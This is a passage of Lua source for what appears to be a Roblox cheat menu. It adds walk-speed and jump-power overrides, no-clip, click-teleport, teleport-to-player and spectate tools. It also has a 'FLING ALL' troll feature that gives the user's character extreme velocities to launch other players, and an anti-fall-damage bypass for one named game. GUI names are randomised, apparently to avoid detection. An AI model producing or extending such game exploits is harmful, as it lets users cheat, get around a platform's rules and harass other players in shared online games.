                _G.NoClipConnection = nil
            end
            
            if lp.Character then
                for _, pt in pairs(lp.Character:GetDescendants()) do
                    if pt:IsA("BasePart") then
                        pt.CanCollide = true
                    end
                end
            end
        end
    end)

    _G.WalkSpeedValue = _G.WalkSpeedValue or 16
    local wsf = Instance.new("Frame")
    wsf.Name = "TextBox"
    wsf.Size = UDim2.new(1, 0, 0, 50)
    wsf.BackgroundColor3 = Config.Theme.Primary
    wsf.BackgroundTransparency = 0.3
    wsf.BorderSizePixel = 0
    wsf.Parent = contents.PLAYER
    
    Utils.RoundCorners(wsf, 8)
    
    local wsl = Instance.new("TextLabel")
    wsl.Size = UDim2.new(0.4, -10, 1, 0)
    wsl.Position = UDim2.new(0, 15, 0, 0)
    wsl.BackgroundTransparency = 1
    wsl.Text = "Walk Speed:"
    wsl.TextColor3 = Config.Theme.Text
    wsl.TextSize = 13
    wsl.Font = Enum.Font.GothamMedium
    wsl.TextXAlignment = Enum.TextXAlignment.Left
    wsl.Parent = wsf
    
    local wstb = Instance.new("TextBox")
    wstb.Size = UDim2.new(0.5, -25, 0, 35)
    wstb.Position = UDim2.new(0.5, 5, 0.5, 0)
    wstb.AnchorPoint = Vector2.new(0, 0.5)
    wstb.BackgroundColor3 = Config.Theme.Secondary
    wstb.BorderSizePixel = 0
    wstb.Text = tostring(_G.WalkSpeedValue)
    wstb.TextColor3 = Config.Theme.Text
    wstb.TextSize = 20
    wstb.Font = Enum.Font.GothamMedium
    wstb.TextXAlignment = Enum.TextXAlignment.Center
    wstb.PlaceholderText = "16 - 200"
    wstb.PlaceholderColor3 = Config.Theme.TextDim
    wstb.ClearTextOnFocus = false
    wstb.Parent = wsf
    
    Utils.RoundCorners(wstb, 6)
    
    local wsp = Instance.new("UIPadding")
    wsp.PaddingLeft = UDim.new(0, 10)
    wsp.PaddingRight = UDim.new(0, 10)
    wsp.Parent = wstb
    
    local function wsfn(val)
            if lp.Character and lp.Character:FindFirstChild("Humanoid") then
            lp.Character.Humanoid.WalkSpeed = val
        end
            end
    
    wstb.FocusLost:Connect(function(ep)
        local vl = tonumber(wstb.Text)
        if vl then
            vl = math.clamp(math.floor(vl), 16, 200)
            wstb.Text = tostring(vl)
            _G.WalkSpeedValue = vl
            wsfn(vl)
        else
            wstb.Text = "16"
            _G.WalkSpeedValue = 16
            wsfn(16)
        end
    end)
    
    lp.CharacterAdded:Connect(function(ch)
        task.wait(0.1)
        if _G.WalkSpeedValue and lp.Character and lp.Character:FindFirstChild("Humanoid") then
            lp.Character.Humanoid.WalkSpeed = _G.WalkSpeedValue
        end
    end)
    
    if lp.Character and lp.Character:FindFirstChild("Humanoid") then
        wsfn(_G.WalkSpeedValue)
    end

    _G.JumpPowerValue = _G.JumpPowerValue or 50
    local jpf = Instance.new("Frame")
    jpf.Name = "TextBox"
    jpf.Size = UDim2.new(1, 0, 0, 50)
    jpf.BackgroundColor3 = Config.Theme.Primary
    jpf.BackgroundTransparency = 0.3
    jpf.BorderSizePixel = 0
    jpf.Parent = contents.PLAYER
    
    Utils.RoundCorners(jpf, 8)
    
    local jpl = Instance.new("TextLabel")
    jpl.Size = UDim2.new(0.4, -10, 1, 0)
    jpl.Position = UDim2.new(0, 15, 0, 0)
    jpl.BackgroundTransparency = 1
    jpl.Text = "Jump Power:"
    jpl.TextColor3 = Config.Theme.Text
    jpl.TextSize = 13
    jpl.Font = Enum.Font.GothamMedium
    jpl.TextXAlignment = Enum.TextXAlignment.Left
    jpl.Parent = jpf
    
    local jptb = Instance.new("TextBox")
    jptb.Size = UDim2.new(0.5, -25, 0, 35)
    jptb.Position = UDim2.new(0.5, 5, 0.5, 0)
    jptb.AnchorPoint = Vector2.new(0, 0.5)
    jptb.BackgroundColor3 = Config.Theme.Secondary
    jptb.BorderSizePixel = 0
    jptb.Text = tostring(_G.JumpPowerValue)
    jptb.TextColor3 = Config.Theme.Text
    jptb.TextSize = 20
    jptb.Font = Enum.Font.GothamMedium
    jptb.TextXAlignment = Enum.TextXAlignment.Center
    jptb.PlaceholderText = "50 - 500"
    jptb.PlaceholderColor3 = Config.Theme.TextDim
    jptb.ClearTextOnFocus = false
    jptb.Parent = jpf
    
    Utils.RoundCorners(jptb, 6)
    
    local jpp = Instance.new("UIPadding")
    jpp.PaddingLeft = UDim.new(0, 10)
    jpp.PaddingRight = UDim.new(0, 10)
    jpp.Parent = jptb
    
    local function jpfn(val)
            if lp.Character and lp.Character:FindFirstChild("Humanoid") then
            lp.Character.Humanoid.JumpPower = val
        end
            end
    
    jptb.FocusLost:Connect(function(ep)
        local vl = tonumber(jptb.Text)
        if vl then
            vl = math.clamp(math.floor(vl), 50, 500)
            jptb.Text = tostring(vl)
            _G.JumpPowerValue = vl
            jpfn(vl)
        else
            jptb.Text = "50"
            _G.JumpPowerValue = 50
            jpfn(50)
        end
    end)
    
    lp.CharacterAdded:Connect(function(ch)
        task.wait(0.1)
        if _G.JumpPowerValue and lp.Character and lp.Character:FindFirstChild("Humanoid") then
            lp.Character.Humanoid.JumpPower = _G.JumpPowerValue
        end
    end)
    
    if lp.Character and lp.Character:FindFirstChild("Humanoid") then
        jpfn(_G.JumpPowerValue)
    end

    Components.CreateLabel(contents.TELEPORT, "TELEPORT & SPECTATE", Config.Theme.Accent)

	Components.CreateToggle(contents.TELEPORT, "CLICK TELEPORT (CTRL+CLICK)", false, function(st)
		if st then
			local ca = workspace.CurrentCamera

			_G.ClickTPConnection = uis.InputBegan:Connect(function(inp, gp)
				if gp then return end
				if inp.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
				if not uis:IsKeyDown(Enum.KeyCode.LeftControl) and not uis:IsKeyDown(Enum.KeyCode.RightControl) then return end

				local ch = lp.Character
				if not ch then return end
				
				local rp = RaycastParams.new()
				rp.FilterType = Enum.RaycastFilterType.Exclude
				rp.FilterDescendantsInstances = {ch}

				local ml = uis:GetMouseLocation()
				local ray = ca:ViewportPointToRay(ml.X, ml.Y)
				local rs = workspace:Raycast(ray.Origin, ray.Direction * 10000, rp)
				
				local tp = nil
				if rs then
					tp = rs.Position
				else
					local mouse = lp:GetMouse()
					if mouse and mouse.Hit then
						tp = mouse.Hit.Position
                end
            end
            
				if not tp then return end
				if not ch:FindFirstChild("HumanoidRootPart") then return end

				local rt = ch.HumanoidRootPart
				rt.AssemblyLinearVelocity = Vector3.new()
				rt.CFrame = CFrame.new(tp + Vector3.new(0, 3, 0))
			end)

			_G.ClickTPCleanup = function()
				if _G.ClickTPConnection then
					_G.ClickTPConnection:Disconnect()
					_G.ClickTPConnection = nil
				end
            end
		else
			if _G.ClickTPCleanup then
				_G.ClickTPCleanup()
				_G.ClickTPCleanup = nil
            end
        end
    end)
    
    Components.CreateButton(contents.TELEPORT, "TELEPORT TO PLAYER", function()

        local existingGui = _G.Gui3
        if existingGui then
            existingGui:Destroy()
        end
        
        local teleportGui = Instance.new("ScreenGui")
        teleportGui.Name = math.random(10000,99999)
        _G.Gui3 = teleportGui
        teleportGui.ResetOnSpawn = false
        teleportGui.Parent = pg
        
        local pl = {}
        for _, p in pairs(ps:GetPlayers()) do
            if p ~= lp then
                table.insert(pl, p)
            end
        end
        
        local mmh = 400
        local ch = 60 + (#pl * 35)
        local mh = math.min(ch, mmh)
        
        local mf = Instance.new("Frame")
        mf.Size = UDim2.new(0, 300, 0, mh)
        mf.Position = UDim2.new(0.5, -150, 0.5, -mh/2)
        mf.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        mf.BorderSizePixel = 0
        mf.Parent = teleportGui
        
        Utils.RoundCorners(mf, 12)
        Utils.MakeDraggable(mf)
        
        local tl = Instance.new("TextLabel")
        tl.Size = UDim2.new(1, -40, 0, 40)
        tl.Position = UDim2.new(0, 10, 0, 10)
        tl.BackgroundTransparency = 1
        tl.Text = "Select Player to Teleport"
        tl.TextColor3 = Color3.fromRGB(255, 255, 255)
        tl.TextSize = 16
        tl.Font = Enum.Font.GothamBold
        tl.TextXAlignment = Enum.TextXAlignment.Center
        tl.Parent = mf
        
        local cb = Instance.new("TextButton")
        cb.Size = UDim2.new(0, 30, 0, 30)
        cb.Position = UDim2.new(1, -35, 0, 10)
        cb.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
        cb.BorderSizePixel = 0
        cb.Text = "X"
        cb.TextColor3 = Color3.fromRGB(255, 255, 255)
        cb.TextSize = 14
        cb.Font = Enum.Font.GothamBold
        cb.Parent = mf
        
        Utils.RoundCorners(cb, 8)
        
        cb.MouseButton1Click:Connect(function()
            teleportGui:Destroy()
        end)
        
        local sf = Instance.new("ScrollingFrame")
        sf.Size = UDim2.new(1, -20, 1, -70)
        sf.Position = UDim2.new(0, 10, 0, 55)
        sf.BackgroundTransparency = 1
        sf.BorderSizePixel = 0
        sf.ScrollBarThickness = 6
        sf.ScrollBarImageColor3 = Color3.fromRGB(255, 255, 255)
        sf.CanvasSize = UDim2.new(0, 0, 0, #pl * 35)
        sf.Parent = mf
        
        for i, p in ipairs(pl) do
            local pb = Instance.new("TextButton")
            pb.Size = UDim2.new(1, -10, 0, 30)
            pb.Position = UDim2.new(0, 0, 0, (i-1) * 35)
            pb.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
            pb.BorderSizePixel = 0
            pb.Text = p.Name
            pb.TextColor3 = Color3.fromRGB(255, 255, 255)
            pb.TextSize = 12
            pb.Font = Enum.Font.Gotham
            pb.Parent = sf
            
            Utils.RoundCorners(pb, 6)
                
            pb.MouseButton1Click:Connect(function()
                if p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
                        if lp.Character and lp.Character:FindFirstChild("HumanoidRootPart") then
                        lp.Character.HumanoidRootPart.CFrame = p.Character.HumanoidRootPart.CFrame
                            
                            teleportGui:Destroy()
                        end
                    else
                    end
                end)
        end
    end)
    
    Components.CreateButton(contents.TELEPORT, "TELEPORT TO RANDOM PLAYER", function()
        local pls = ps:GetPlayers()
        local op = {}
        
        for _, p in pairs(pls) do
            if p ~= lp and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
                table.insert(op, p)
            end
        end
        
        if #op > 0 then
            local rp = op[math.random(#op)]
            if lp.Character and lp.Character:FindFirstChild("HumanoidRootPart") then
                lp.Character.HumanoidRootPart.CFrame = rp.Character.HumanoidRootPart.CFrame
            end
        else
        end
    end)
    
    Components.CreateToggle(contents.TELEPORT, "SPECTATE PLAYER", false, function(st)
        if st then
            if lp.Character and lp.Character:FindFirstChild("Humanoid") then
                local hu = lp.Character.Humanoid
                local ca = workspace.CurrentCamera
                
                _G.OriginalCameraType = ca.CameraType
                _G.OriginalCameraSubject = ca.CameraSubject
                
                local sg = Instance.new("ScreenGui")
                sg.Name = math.random(10000,99999)
                sg.ResetOnSpawn = false
                sg.Parent = pg
                
                local sf = Instance.new("Frame")
                sf.Size = UDim2.new(0, 300, 0, 200)
                sf.Position = UDim2.new(0.5, -150, 0.5, -100)
                sf.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
                sf.BorderSizePixel = 0
                sf.Parent = sg
                
                local cn = Instance.new("UICorner")
                cn.CornerRadius = UDim.new(0, 8)
                cn.Parent = sf
                
                local tt = Instance.new("TextLabel")
                tt.Size = UDim2.new(1, -80, 0, 30)
                tt.Position = UDim2.new(0, 10, 0, 10)
                tt.BackgroundTransparency = 1
                tt.Text = "SPECTATE MODE"
                tt.TextColor3 = Color3.fromRGB(255, 255, 255)
                tt.TextSize = 18
                tt.Font = Enum.Font.GothamBold
                tt.Parent = sf
                
                local mb = Instance.new("TextButton")
                mb.Size = UDim2.new(0, 30, 0, 30)
                mb.Position = UDim2.new(1, -70, 0, 10)
                mb.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
                mb.BorderSizePixel = 0
                mb.Text = "_"
                mb.TextColor3 = Color3.fromRGB(255, 255, 255)
                mb.TextSize = 20
                mb.Font = Enum.Font.GothamBold
                mb.Parent = sf
                
                local mc = Instance.new("UICorner")
                mc.CornerRadius = UDim.new(0, 6)
                mc.Parent = mb
                
                local cb = Instance.new("TextButton")
                cb.Size = UDim2.new(0, 30, 0, 30)
                cb.Position = UDim2.new(1, -35, 0, 10)
                cb.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
                cb.BorderSizePixel = 0
                cb.Text = "X"
                cb.TextColor3 = Color3.fromRGB(255, 255, 255)
                cb.TextSize = 16
                cb.Font = Enum.Font.GothamBold
                cb.Parent = sf
                
                local cc = Instance.new("UICorner")
                cc.CornerRadius = UDim.new(0, 6)
                cc.Parent = cb
                
                cb.MouseButton1Click:Connect(function()
                    sg:Destroy()
                    if _G.OriginalCameraSubject then
                        ca.CameraSubject = _G.OriginalCameraSubject
                    end
                end)
                
                local dr = false
                local di, mp, fp
                
                sf.InputBegan:Connect(function(inp)
                    if inp.UserInputType == Enum.UserInputType.MouseButton1 then
                        dr = true
                        mp = inp.Position
                        fp = sf.Position
                        
                        inp.Changed:Connect(function()
                            if inp.UserInputState == Enum.UserInputState.End then
                                dr = false
                            end
                        end)
                    end
                end)
                
                sf.InputChanged:Connect(function(inp)
                    if inp.UserInputType == Enum.UserInputType.MouseMovement then
                        di = inp
                    end
                end)
                
                uis.InputChanged:Connect(function(inp)
                    if inp == di and dr then
                        local dt = inp.Position - mp
                        sf.Position = UDim2.new(
                            fp.X.Scale,
                            fp.X.Offset + dt.X,
                            fp.Y.Scale,
                            fp.Y.Offset + dt.Y
                        )
                    end
                end)
                
                local ins = Instance.new("TextLabel")
                ins.Size = UDim2.new(1, -20, 0, 40)
                ins.Position = UDim2.new(0, 10, 0, 40)
                ins.BackgroundTransparency = 1
                ins.Text = "Press ESC to stop spectating"
                ins.TextColor3 = Color3.fromRGB(180, 180, 180)
                ins.TextSize = 14
                ins.Font = Enum.Font.Gotham
                ins.TextWrapped = true
                ins.Parent = sf
                
                local pl = Instance.new("ScrollingFrame")
                pl.Size = UDim2.new(1, -20, 0, 100)
                pl.Position = UDim2.new(0, 10, 0, 90)
                pl.BackgroundTransparency = 1
                pl.BorderSizePixel = 0
                pl.ScrollBarThickness = 4
                pl.Parent = sf
                
                local ll = Instance.new("UIListLayout")
                ll.SortOrder = Enum.SortOrder.LayoutOrder
                ll.Parent = pl
                
                for _, p in pairs(ps:GetPlayers()) do
                    if p ~= lp then
                        local pb = Instance.new("TextButton")
                        pb.Size = UDim2.new(1, 0, 0, 25)
                        pb.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
                        pb.BorderSizePixel = 0
                        pb.Text = p.Name
                        pb.TextColor3 = Color3.fromRGB(255, 255, 255)
                        pb.TextSize = 14
                        pb.Font = Enum.Font.Gotham
                        pb.Parent = pl
                        
                        local bc = Instance.new("UICorner")
                        bc.CornerRadius = UDim.new(0, 4)
                        bc.Parent = pb
                        
                        pb.MouseButton1Click:Connect(function()
                            if p.Character and p.Character:FindFirstChild("Humanoid") then
                                ca.CameraSubject = p.Character.Humanoid
                            end
                        end)
                    end
                end
                
                pl.CanvasSize = UDim2.new(0, 0, 0, ll.AbsoluteContentSize.Y)
                
                local im = false
                local os = sf.Size
                
                mb.MouseButton1Click:Connect(function()
                    im = not im
                    
                    if im then
                        sf.Size = UDim2.new(0, 300, 0, 50)
                        ins.Visible = false
                        pl.Visible = false
                        mb.Text = "+"
                    else
                        sf.Size = os
                        ins.Visible = true
                        pl.Visible = true
                        mb.Text = "_"
                    end
                end)
                
                _G.Gui4 = sg
                
                _G.Conn1 = uis.InputBegan:Connect(function(inp, gp)
                    if inp.KeyCode == Enum.KeyCode.Escape then
                        ca.CameraSubject = hu
                    end
                end)
            end
        else
            if _G.Conn1 then
                _G.Conn1:Disconnect()
                _G.Conn1 = nil
            end
            
            if _G.Gui4 then
                _G.Gui4:Destroy()
                _G.Gui4 = nil
            end
            
            if lp.Character and lp.Character:FindFirstChild("Humanoid") then
                workspace.CurrentCamera.CameraSubject = lp.Character.Humanoid
            end
        end
    end)

    Components.CreateLabel(contents["TROLL"], "TROLL FEATURES", Config.Theme.Accent)
    
    Components.CreateButton(contents["TROLL"], "FLING ALL", function()

        local tg = {}
        local p2 = ps
        local pl2 = lp
        local ui2 = uis
        local r2 = rs
        local ab = false

        local ne = false
        local nc = nil
        local oc = {}

        local af = false
        local ac = nil

        local flingEnv = {
            OldPos = nil,
            FPDH = workspace.FallenPartsDestroyHeight,
            Welcome = false
        }
        
        local function getEnv()
            return flingEnv
        end

        local function gp(n)
            n = n:lower()
            if n == "all" or n == "others" then
                ab = true
                return
            elseif n == "random" then
                local gp2 = ps:GetPlayers()
                if table.find(gp2, pl2) then
                    table.remove(gp2, table.find(gp2, pl2))
                end
                return gp2[math.random(#gp2)]
            elseif n ~= "random" and n ~= "all" and n ~= "others" then
                for _, x in next, ps:GetPlayers() do
                    if x ~= pl2 then
                        if x.Name:lower():match("^" .. n) then
                            return x
                        elseif x.DisplayName:lower():match("^" .. n) then
                            return x
                        end
                    end
                end
            else
                return
            end
        end

        local function msg(tt, tx, tm)
            game:GetService("StarterGui"):SetCore("SendNotification", {Title = tt, Text = tx, Duration = tm})
        end

        local function tn()
            ne = not ne
            
            if ne then
                if lp.Character then
                    for _, pt in pairs(lp.Character:GetChildren()) do
                        if pt:IsA("BasePart") then
                            oc[pt] = pt.CanCollide
                        end
                    end
                end
                
                nc = rs.Stepped:Connect(function()
                    if pl2.Character and pl2.Character:FindFirstChild("Humanoid") and pl2.Character:FindFirstChild("HumanoidRootPart") then
                        for _, pt in pairs(pl2.Character:GetChildren()) do
                            if pt:IsA("BasePart") and pt.CanCollide then
                                pt.CanCollide = false
                            end
                        end
                    end
                end)
                msg("Noclip", "Enabled", 3)
            else
                if nc then
                    nc:Disconnect()
                    nc = nil
                end
                
                if pl2.Character then
                    local hrp = pl2.Character:FindFirstChild("HumanoidRootPart")
                    
                    if hrp then
                        local rc = workspace:Raycast(hrp.Position, Vector3.new(0, -10, 0))
                        if not rc then
                            local dr = workspace:Raycast(hrp.Position, Vector3.new(0, -1000, 0))
                            if dr then
                                hrp.CFrame = CFrame.new(dr.Position + Vector3.new(0, 5, 0))
                            end
                        end
                    end
                    
                    task.wait(0.1)
                    
                    for _, pt in pairs(lp.Character:GetChildren()) do
                        if pt:IsA("BasePart") then
                            local ov = oc[pt]
                            if ov ~= nil then
                                pt.CanCollide = ov
                            else
                                if pt.Name == "HumanoidRootPart" then
                                    pt.CanCollide = false
                                else
                                    pt.CanCollide = true
                                end
                            end
                        end
                    end
                    
                    local hu = lp.Character:FindFirstChild("Humanoid")
                    if hu then
                        hu:ChangeState(Enum.HumanoidStateType.Physics)
                        task.wait(0.1)
                        hu:ChangeState(Enum.HumanoidStateType.Running)
                    end
                end
                
                oc = {}
                msg("Noclip", "Disabled", 3)
            end
        end

        local function taf()
            af = not af
            
            if af then
                local pd = game.PlaceId
                if pd ~= 189707 then
                    msg("Error", "Not Natural Disasters Survival!", 5)
                    af = false
                    return
                end
                
                local rs2 = game:GetService("RunService")
                local hb2 = rs2.Heartbeat
                local rsd2 = rs2.RenderStepped
                local lp3 = lp
                local zv = Vector3.zero
                
                local function afn(ch)
                    local rp = ch:WaitForChild("HumanoidRootPart")
                    if rp then
                        local cn2
                        cn2 = hb2:Connect(function()
                            if not af or not rp.Parent then
                                cn2:Disconnect()
                                return
                            end
                            local vl = rp.AssemblyLinearVelocity
                            rp.AssemblyLinearVelocity = zv
                            rsd2:Wait()
                            rp.AssemblyLinearVelocity = vl
                        end)
                        ac = cn2
                    end
                end
                
                afn(lp.Character)
                lp.CharacterAdded:Connect(function(ch2)
                    if af then
                        afn(ch2)
                    end
                end)
                
                msg("AntiFallDamage", "Enabled (NDS)", 3)
            else
                if ac then
                    ac:Disconnect()
                    ac = nil
                end
                msg("AntiFallDamage", "Disabled", 3)
            end
        end

        local function sf(tp)
            local ch = lp.Character
            local hu = ch and ch:FindFirstChildOfClass("Humanoid")
            local rp = hu and hu.RootPart
            local tch = tp.Character
            local thu
            local trp
            local thd
            local acc
            local hdl

            if tch:FindFirstChildOfClass("Humanoid") then
                thu = tch:FindFirstChildOfClass("Humanoid")
            end
            if thu and thu.RootPart then
                trp = thu.RootPart
            end
            if tch:FindFirstChild("Head") then
                thd = tch.Head
            end
            if tch:FindFirstChildOfClass("Accessory") then
                acc = tch:FindFirstChildOfClass("Accessory")
            end
            if acc and acc:FindFirstChild("Handle") then
                hdl = acc.Handle
            end

            if ch and hu and rp then
                local rpVelocity = rp.AssemblyLinearVelocity or rp.Velocity or Vector3.new()
                if rpVelocity.Magnitude < 50 then
                    getEnv().OldPos = rp.CFrame
                end
                if thu and thu.Sit and not ab then
                    return msg("Error Occurred", "Targeting is sitting", 5)
                end

                if thd then
                    workspace.CurrentCamera.CameraSubject = thd
                elseif not thd and hdl then
                    workspace.CurrentCamera.CameraSubject = hdl
                elseif thu and trp then
                    workspace.CurrentCamera.CameraSubject = thu
                end

                if not tch:FindFirstChildWhichIsA("BasePart") then
                    return
                end

                local function fp(bp, ps, ag)
                    rp.CFrame = CFrame.new(bp.Position) * ps * ag
                    ch:SetPrimaryPartCFrame(CFrame.new(bp.Position) * ps * ag)
                    rp.AssemblyLinearVelocity = Vector3.new(9e7, 9e7 * 10, 9e7)
                    rp.AssemblyAngularVelocity = Vector3.new(9e8, 9e8, 9e8)
                end

                local function sfb(bp)
                    local tw = 2
                    local tm = tick()
                    local ag = 0
                    repeat
                        if rp and thu then
                            local bpVelocity = bp.AssemblyLinearVelocity or bp.Velocity or Vector3.new()
                            if bpVelocity.Magnitude < 50 then
                                ag = ag + 100
                                local bpVelMag = bpVelocity.Magnitude
                                fp(bp, CFrame.new(0, 1.5, 0) + thu.MoveDirection * bpVelMag / 1.25, CFrame.Angles(math.rad(ag), 0, 0))
                                task.wait()
                                fp(bp, CFrame.new(0, -1.5, 0) + thu.MoveDirection * bpVelMag / 1.25, CFrame.Angles(math.rad(ag), 0, 0))
                                task.wait()
                                fp(bp, CFrame.new(2.25, 1.5, -2.25) + thu.MoveDirection * bpVelMag / 1.25, CFrame.Angles(math.rad(ag), 0, 0))
                                task.wait()
                                fp(bp, CFrame.new(-2.25, -1.5, 2.25) + thu.MoveDirection * bpVelMag / 1.25, CFrame.Angles(math.rad(ag), 0, 0))
                                task.wait()
                                fp(bp, CFrame.new(0, 1.5, 0) + thu.MoveDirection, CFrame.Angles(math.rad(ag), 0, 0))
                                task.wait()
                                fp(bp, CFrame.new(0, -1.5, 0) + thu.MoveDirection, CFrame.Angles(math.rad(ag), 0, 0))
                                task.wait()
                            else
                                local trpVelocity = trp.AssemblyLinearVelocity or trp.Velocity or Vector3.new()
                                local trpVelMag = trpVelocity.Magnitude
                                fp(bp, CFrame.new(0, 1.5, thu.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
                                task.wait()
                                fp(bp, CFrame.new(0, -1.5, -thu.WalkSpeed), CFrame.Angles(0, 0, 0))
                                task.wait()
                                fp(bp, CFrame.new(0, 1.5, thu.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
                                task.wait()
                                fp(bp, CFrame.new(0, 1.5, trpVelMag / 1.25), CFrame.Angles(math.rad(90), 0, 0))
                                task.wait()
                                fp(bp, CFrame.new(0, -1.5, -trpVelMag / 1.25), CFrame.Angles(0, 0, 0))
                                task.wait()
                                fp(bp, CFrame.new(0, 1.5, trpVelMag / 1.25), CFrame.Angles(math.rad(90), 0, 0))
                                task.wait()
                                fp(bp, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(90), 0, 0))
                                task.wait()
                                fp(bp, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
                                task.wait()
                                fp(bp, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(-90), 0, 0))
                                task.wait()
                                fp(bp, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
                                task.wait()
                            end
                        else
                            break
                        end
                        local bpVelCheck = bp.AssemblyLinearVelocity or bp.Velocity or Vector3.new()
                    until bpVelCheck.Magnitude > 500 or bp.Parent ~= tp.Character or tp.Parent ~= p2 or not tp.Character == tch or thu.Sit or hu.Health <= 0 or tick() > tm + tw
                end

                workspace.FallenPartsDestroyHeight = -math.huge
                local bv = Instance.new("BodyVelocity")
                bv.Name = "EpixVel"
                bv.Parent = rp
                bv.Velocity = Vector3.new(9e8, 9e8, 9e8)
                bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                hu:SetStateEnabled(Enum.HumanoidStateType.Seated, false)

                if trp and thd then
                    if (trp.CFrame.p - thd.CFrame.p).Magnitude > 5 then
                        sfb(thd)
                    else
                        sfb(trp)
                    end
                elseif trp and not thd then
                    sfb(trp)
                elseif not trp and thd then
                    sfb(thd)
                elseif not trp and not thd and acc and hdl then
                    sfb(hdl)
                else
                    return msg("Error Occurred", "Target is missing everything", 5)
                end

                bv:Destroy()
                hu:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
                workspace.CurrentCamera.CameraSubject = hu

                if getEnv().OldPos then
                    repeat
                        rp.CFrame = getEnv().OldPos * CFrame.new(0, .5, 0)
                        ch:SetPrimaryPartCFrame(getEnv().OldPos * CFrame.new(0, .5, 0))
                        hu:ChangeState("GettingUp")
                        table.foreach(ch:GetChildren(), function(_, x)
                            if x:IsA("BasePart") then
                                x.AssemblyLinearVelocity = Vector3.new()
                                x.AssemblyAngularVelocity = Vector3.new()
                            end
                        end)
                        task.wait()
                    until (rp.Position - getEnv().OldPos.p).Magnitude < 25
                end
                workspace.FallenPartsDestroyHeight = getEnv().FPDH
            else
                return msg("Error Occurred", "Random error", 5)
            end
        end

        local sg = Instance.new("ScreenGui")
        sg.Name = math.random(10000,99999)
        sg.ResetOnSpawn = false
        sg.Parent = game:GetService("CoreGui") or pg

        local md = Instance.new("Frame")
        md.Size = UDim2.new(0, 293, 0, 140)
        md.Position = UDim2.new(0.5, -146.5, 0.5, -70)
        md.AnchorPoint = Vector2.new(0.5, 0.5)
        md.BackgroundColor3 = Config.Theme.Primary
        md.BorderSizePixel = 0
        md.ClipsDescendants = true
        md.Parent = sg
        Utils.RoundCorners(md, 12)
        Utils.AddStroke(md, Config.Theme.Border, 2)

        local gradientBg = Instance.new("Frame")
        gradientBg.Name = "GradientBg"
        gradientBg.Size = UDim2.new(1, 0, 1, 0)
        gradientBg.BackgroundColor3 = Config.Theme.Primary
        gradientBg.BackgroundTransparency = 0.5
        gradientBg.BorderSizePixel = 0
        gradientBg.ZIndex = 0
        gradientBg.Parent = md
        Utils.CreateGradient(gradientBg, Color3.fromRGB(2, 2, 2), Color3.fromRGB(0, 0, 0), 45)
        Utils.RoundCorners(gradientBg, 12)

        local titleBar = Instance.new("Frame")
        titleBar.Name = "TitleBar"
        titleBar.Size = UDim2.new(1, 0, 0, 40)
        titleBar.Position = UDim2.new(0, 0, 0, 0)
        titleBar.BackgroundColor3 = Config.Theme.Secondary
        titleBar.BackgroundTransparency = 0.3
        titleBar.BorderSizePixel = 0
        titleBar.Parent = md
        Utils.RoundCorners(titleBar, 12)
        
        local tl = Instance.new("TextLabel")
        tl.Name = "Title"
        tl.Size = UDim2.new(1, -80, 1, 0)
        tl.AnchorPoint = Vector2.new(0.5, 0)
        tl.Position = UDim2.new(0.5, 0, 0, 0)
        tl.BackgroundTransparency = 1
        tl.Text = "FLING ALL"
        tl.TextColor3 = Config.Theme.Text
        tl.TextSize = 14
        tl.Font = Enum.Font.GothamBold
        tl.TextXAlignment = Enum.TextXAlignment.Center
        tl.Parent = titleBar

        local cb = Instance.new("TextButton")
        cb.Name = "CloseBtn"
        cb.Size = UDim2.new(0, 30, 0, 30)
        cb.Position = UDim2.new(1, -35, 0, 5)
        cb.BackgroundColor3 = Config.Theme.Danger
        cb.BorderSizePixel = 0
        cb.Text = "X"
        cb.TextColor3 = Config.Theme.Text
        cb.TextSize = 14
        cb.Font = Enum.Font.GothamBold
        cb.Parent = titleBar
        Utils.RoundCorners(cb, 8)

        local inputContainer = Instance.new("Frame")
        inputContainer.Name = "InputContainer"
        inputContainer.Size = UDim2.new(1, -20, 0, 35)
        inputContainer.Position = UDim2.new(0, 10, 0, 45)
        inputContainer.BackgroundTransparency = 1
        inputContainer.Parent = md

        local inp = Instance.new("TextBox")
        inp.Name = "PlayerNameInput"
        inp.Size = UDim2.new(1, 0, 1, 0)
        inp.Position = UDim2.new(0, 0, 0, 0)
        inp.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
        inp.BorderSizePixel = 0
        inp.Text = ""
        inp.PlaceholderText = "PLAYER OR ALL"
        inp.TextColor3 = Config.Theme.Text
        inp.PlaceholderColor3 = Config.Theme.TextDim
        inp.TextSize = 15
        inp.Font = Enum.Font.Gotham
        inp.TextXAlignment = Enum.TextXAlignment.Center
        inp.ClearTextOnFocus = false
        inp.Parent = inputContainer

        local textPadding = Instance.new("UIPadding")
        textPadding.PaddingLeft = UDim.new(0, 10)
        textPadding.PaddingRight = UDim.new(0, 10)
        textPadding.Parent = inp
        
        Utils.RoundCorners(inp, 6)
        Utils.AddStroke(inp, Config.Theme.Border, 1)

        local ab2 = Instance.new("TextButton")
        ab2.Name = "ExecuteBtn"
        ab2.Size = UDim2.new(1, -20, 0, 40)
        ab2.Position = UDim2.new(0, 10, 0, 88)
        ab2.BackgroundTransparency = 1
        ab2.BorderSizePixel = 0
        ab2.Text = "EXECUTE"
        ab2.TextColor3 = Config.Theme.Text
        ab2.TextSize = 13
        ab2.Font = Enum.Font.GothamBold
        ab2.TextXAlignment = Enum.TextXAlignment.Center
        ab2.Parent = md

        ab2.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 then
                input:Capture()
            end
        end)
        
        inp.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 then
                input:Capture()
            end
        end)
        
